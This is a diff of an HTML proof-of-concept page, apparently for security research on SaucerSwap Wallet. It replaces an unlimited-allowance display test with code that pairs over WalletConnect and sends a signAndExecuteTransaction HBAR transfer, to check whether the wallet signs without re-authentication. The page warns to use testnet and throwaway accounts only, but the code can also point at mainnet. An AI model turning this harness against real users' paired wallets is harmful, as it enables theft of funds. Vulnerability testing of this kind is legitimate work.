@@ -2,77 +2,217 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>SaucerSwap Wallet — WalletConnect Unauthenticated Signing PoC</title>
 <script src="https://unpkg.com/@hiero-ledger/sdk@2.70.0/dist/umd.js"></script>
+<style>
+  body { font-family: -apple-system, sans-serif; max-width: 640px; margin: 0 auto; padding: 16px; }
+  input { width: 100%; padding: 6px; margin: 4px 0 12px; box-sizing: border-box; }
+  button { padding: 10px 14px; margin: 6px 6px 6px 0; font-weight: 600; }
+  #uri { word-break: break-all; background: #eee; padding: 8px; font-family: monospace; font-size: 12px; margin: 8px 0; }
+  #log { background: #111; color: #0f0; padding: 10px; font-size: 12px; white-space: pre-wrap; word-break: break-all; height: 300px; overflow-y: auto; }
+  .warn { background: #fff3cd; border: 1px solid #d29922; padding: 10px; font-size: 13px; margin-bottom: 16px; }
+</style>
 </head>
 <body>
-<h1>SaucerSwap Wallet — Allowance Amount Display PoC</h1>
-<p>Confirms whether the wallet's approval confirmation screen visually distinguishes
-a normal-sized allowance from a near-max ("unlimited") one.</p>
-
-<p>Owner: <input id="ownerId" value="0.0.10190152"></p>
-<p>Spender: <input id="spenderId" value="0.0.10130162"></p>
-<p>Token (HTS token id, leave blank for HBAR): <input id="tokenId" value=""></p>
-
-<button onclick="approve('normal')">1. Approve NORMAL amount (100 units)</button><br><br>
-<button onclick="approve('max')">2. Approve MAX_INT64 amount</button>
-
+ 
+<h1>SaucerSwap Wallet — Unauthenticated Signing PoC</h1>
+<p>Pairs via WalletConnect, then sends a real <code>signAndExecuteTransaction</code> request
+(small testnet HBAR transfer) to confirm whether the wallet requires re-authentication
+before signing a request from an already-paired external dApp.</p>
+ 
+<div class="warn">
+  <strong>Testnet + throwaway account only.</strong> This sends a real transaction if the
+  wallet signs it. Never pair an account holding anything you care about. Discard the
+  paired account after this test.
+</div>
+ 
+<p>WalletConnect Project ID: <input id="projectId" placeholder="from cloud.walletconnect.com"></p>
+<p>Network: <input id="network" value="testnet"></p>
+<button onclick="initWc()">1. Initialize</button>
+<button onclick="pair()">2. Pair with wallet</button>
+<div id="uri"></div>
+ 
+<hr>
+ 
+<p>Owner (paired account — auto-filled after pairing): <input id="ownerId" value="0.0.10190152"></p>
+<p>Recipient (second account you control): <input id="recipientId" value="0.0.10130162"></p>
+<p>Amount to transfer (tinybars — default 1 HBAR = 100000000): <input id="amountTinybars" value="100000000"></p>
+ 
+<button onclick="checkBalance('owner')">3. Check owner balance (before)</button>
+<button onclick="sendSignAndExecute()">4. Send signAndExecuteTransaction</button>
+<button onclick="checkBalance('owner')">5. Check owner balance (after)</button>
+ 
 <pre id="log"></pre>
+ 
 <script>
 function log(msg) {
-  document.getElementById('log').textContent += new Date().toISOString() + " - " + msg + "\n";
+  const el = document.getElementById('log');
+  el.textContent += new Date().toISOString() + " - " + msg + "\n";
+  el.scrollTop = el.scrollHeight;
+  console.log(msg);
 }
-
-// int64 max = 9223372036854775807
-const MAX_INT64 = "9223372036854775807";
-
-async function approve(mode) {
+ 
+const HEDERA_METHODS = {
+  SIGN_MESSAGE: 'hedera_signMessage',
+  SIGN_AND_EXECUTE_TRANSACTION: 'hedera_signAndExecuteTransaction',
+  EXECUTE_TRANSACTION: 'hedera_executeTransaction',
+  SIGN_AND_EXECUTE_QUERY: 'hedera_signAndExecuteQuery'
+};
+ 
+let signClient = null;
+let session = null;
+let pairedAccountId = null;
+let network = 'testnet';
+ 
+function bytesToBase64(bytes) {
+  let binary = '';
+  const len = bytes.byteLength || bytes.length;
+  for (let i = 0; i < len; i++) binary += String.fromCharCode(bytes[i]);
+  return btoa(binary);
+}
+ 
+async function initWc() {
+  const projectId = document.getElementById('projectId').value.trim();
+  network = document.getElementById('network').value.trim() || 'testnet';
+  if (!projectId) { log('ERROR: enter a WalletConnect Project ID first.'); return; }
+  log('Loading WalletConnect SignClient…');
   try {
-    const { AccountAllowanceApproveTransaction, AccountId, TokenId, Hbar, TransactionId } = sdk;
-    const ownerStr = document.getElementById('ownerId').value.trim();
-    const spenderStr = document.getElementById('spenderId').value.trim();
-    const tokenStr = document.getElementById('tokenId').value.trim();
-
-    const owner = AccountId.fromString(ownerStr);
-    const spender = AccountId.fromString(spenderStr);
-
-    const tx = new AccountAllowanceApproveTransaction();
-
-    if (tokenStr) {
-      const tokenId = TokenId.fromString(tokenStr);
-      const amount = mode === 'max' ? MAX_INT64 : "100";
-      log("Building TOKEN allowance: owner=" + ownerStr + " spender=" + spenderStr +
-          " token=" + tokenStr + " amount=" + amount + " (" + mode + ")");
-      tx.approveTokenAllowance(tokenId, owner, spender, amount);
-    } else {
-      // HBAR is denominated in tinybars; MAX_INT64 tinybars for the "unlimited" case
-      const amount = mode === 'max' ? Hbar.fromTinybars(MAX_INT64) : Hbar.fromTinybars("10000000000"); // 100 HBAR
-      log("Building HBAR allowance: owner=" + ownerStr + " spender=" + spenderStr +
-          " amount(tinybars)=" + amount.toTinybars().toString() + " (" + mode + ")");
-      tx.approveHbarAllowance(owner, spender, amount);
-    }
-
-    tx.setTransactionId(TransactionId.generate(owner))
-      .setNodeAccountIds([AccountId.fromString("0.0.3")])
-      .freeze();
-
-    const bytes = tx.toBytes();
-    const base64Bytes = btoa(String.fromCharCode(...bytes));
-    log("Built approval tx bytes (base64), length: " + base64Bytes.length);
-
-    if (!window.saucerswapWallet) {
-      log("ERROR: window.saucerswapWallet not found. Confirm the injected object name in this wallet's dApp browser first.");
-      return;
-    }
-
-    log("Calling signTransaction() — TAKE A SCREENSHOT of the wallet's confirmation screen now.");
-    window.saucerswapWallet.signTransaction(base64Bytes)
-      .then(result => log("signTransaction() resolved: " + JSON.stringify(result)))
-      .catch(err => log("signTransaction() rejected/cancelled: " + err.message));
+    const mod = await import('https://esm.sh/@walletconnect/sign-client@2.11.0');
+    const SignClient = mod.SignClient;
+    signClient = await SignClient.init({
+      projectId,
+      metadata: {
+        name: 'SaucerSwap Wallet Security PoC',
+        description: 'Authorized research — WalletConnect auth-gate verification',
+        url: 'https://nathanogaga118.github.io',
+        icons: []
+      }
+    });
+    log('SignClient initialized.');
+    signClient.on('session_delete', () => { log('WARNING: session was disconnected by the wallet.'); session = null; });
   } catch (e) {
-    log("Error: " + e.message);
+    log('Init failed: ' + e.message);
+  }
+}
+ 
+async function pair() {
+  if (!signClient) { log('ERROR: initialize first (step 1).'); return; }
+  log('Requesting pairing URI (chain: hedera:' + network + ')…');
+  try {
+    const chainId = 'hedera:' + network;
+    const { uri, approval } = await signClient.connect({
+      requiredNamespaces: {
+        hedera: {
+          methods: Object.values(HEDERA_METHODS),
+          chains: [chainId],
+          events: ['chainChanged', 'accountsChanged']
+        }
+      }
+    });
+    if (uri) {
+      document.getElementById('uri').innerHTML =
+        '<div>' + uri + '</div><a href="' + uri + '" target="_blank">Open in wallet (deep link)</a>';
+      log('Pairing URI generated — open it with your THROWAWAY test wallet.');
+    }
+    log('Waiting for wallet approval…');
+    const t0 = performance.now();
+    session = await approval();
+    log('Session approved. (' + (performance.now() - t0).toFixed(0) + 'ms)');
+ 
+    const accounts = Object.values(session.namespaces).map(ns => ns.accounts).flat();
+    log('Paired accounts: ' + JSON.stringify(accounts));
+    if (accounts.length > 0) {
+      pairedAccountId = accounts[0].split(':')[2];
+      document.getElementById('ownerId').value = pairedAccountId;
+      log('Owner field set to paired account: ' + pairedAccountId);
+    }
+  } catch (e) {
+    log('Pairing failed: ' + e.message);
+  }
+}
+ 
+async function checkBalance(which) {
+  const accountId = document.getElementById('ownerId').value.trim();
+  if (!accountId) { log('ERROR: no account id set.'); return; }
+  try {
+    const mirrorBase = network === 'mainnet'
+      ? 'https://mainnet-public.mirrornode.hedera.com'
+      : 'https://' + network + '.mirrornode.hedera.com';
+    const res = await fetch(mirrorBase + '/api/v1/accounts/' + accountId);
+    if (!res.ok) throw new Error('Mirror Node HTTP ' + res.status);
+    const info = await res.json();
+    const hbarBalance = info.balance ? info.balance.balance : 'unknown';
+    log('Balance check (' + which + ') for ' + accountId + ': ' + hbarBalance + ' tinybars');
+  } catch (e) {
+    log('Balance check failed: ' + e.message);
+  }
+}
+ 
+async function sendSignAndExecute() {
+  if (!signClient || !session || !pairedAccountId) {
+    log('ERROR: pair first (step 2) before sending a request.');
+    return;
+  }
+  try {
+    const { TransferTransaction, AccountId, Hbar, TransactionId } = sdk;
+ 
+    const ownerStr = document.getElementById('ownerId').value.trim();
+    const recipientStr = document.getElementById('recipientId').value.trim();
+    const amountTinybars = document.getElementById('amountTinybars').value.trim();
+ 
+    const owner = AccountId.fromString(ownerStr);
+    const recipient = AccountId.fromString(recipientStr);
+ 
+    log('Building TransferTransaction: ' + ownerStr + ' -> ' + recipientStr +
+        ', amount=' + amountTinybars + ' tinybars');
+ 
+    const tx = new TransferTransaction()
+      .addHbarTransfer(owner, Hbar.fromTinybars(-amountTinybars))
+      .addHbarTransfer(recipient, Hbar.fromTinybars(amountTinybars))
+      .setTransactionId(TransactionId.generate(owner))
+      .setNodeAccountIds([AccountId.fromString('0.0.3')])
+      .freeze();
+ 
+    const bytes = tx.toBytes();
+    const base64Bytes = bytesToBase64(bytes);
+    log('Built transaction bytes (base64), length: ' + base64Bytes.length);
+ 
+    const chainId = 'hedera:' + network;
+    const request = {
+      topic: session.topic,
+      chainId,
+      request: {
+        method: HEDERA_METHODS.SIGN_AND_EXECUTE_TRANSACTION,
+        params: {
+          signerAccountId: chainId + ':' + ownerStr,
+          // NOTE: confirm this param name against the wallet's actual
+          // hedera-wallet-connect implementation before relying on it —
+          // spec commonly uses `transactionList` for base64-encoded tx bytes.
+          transactionList: base64Bytes
+        }
+      }
+    };
+ 
+    log('⏱ Sending ' + HEDERA_METHODS.SIGN_AND_EXECUTE_TRANSACTION +
+        ' now — OBSERVE THE DEVICE for any biometric/PIN prompt starting this instant.');
+    const t0 = performance.now();
+    const sentAt = new Date().toISOString();
+ 
+    const result = await signClient.request(request);
+ 
+    const elapsed = (performance.now() - t0).toFixed(0);
+    log('Response received after ' + elapsed + 'ms (sent at ' + sentAt + ').');
+    log('Raw response: ' + JSON.stringify(result));
+    log('If no prompt appeared on-device between the "Sending" line above and this ' +
+        'response, the request was signed and executed without re-authentication.');
+    log('Run step 5 (balance check) now and compare against step 3 to confirm on-chain movement.');
+  } catch (e) {
+    log('Request failed/rejected: ' + e.message);
     console.error(e);
   }
 }
 </script>
+ 
 </body>
 </html>
+ 
